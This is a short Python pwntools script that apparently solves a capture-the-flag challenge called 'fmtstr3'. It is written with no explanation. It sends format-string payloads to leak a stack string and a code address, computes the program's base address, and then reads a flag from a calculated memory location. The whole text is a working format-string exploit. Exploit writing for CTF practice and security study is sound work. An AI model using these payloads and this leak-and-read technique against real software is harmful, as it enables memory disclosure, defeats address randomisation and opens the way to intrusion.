from pwn import *

exe = ELF('fmtstr3', checksec = False)
r = process(exe.path)

flag = b''
payload = b'%8$s%17$p'
r.sendlineafter(b'name: ', payload)
flag += r.recvuntil(b'0x', drop=True)
base_leak = int(r.recvline()[:-1], 16)
log.info("base leak: " + hex(base_leak))
exe.address = base_leak - 0x14e6
log.info("exe leak: " + hex(exe.address))
flag2 = exe.address + 0x4060
log.info("flag2: " + hex(flag2))

#input()
payload = b'%13$saaa' + p64(flag2)
r.sendlineafter(b'greeting: ', payload)
flag += r.recvuntil(b'}')
log.info('Flag: ' + flag.decode())
r.interactive()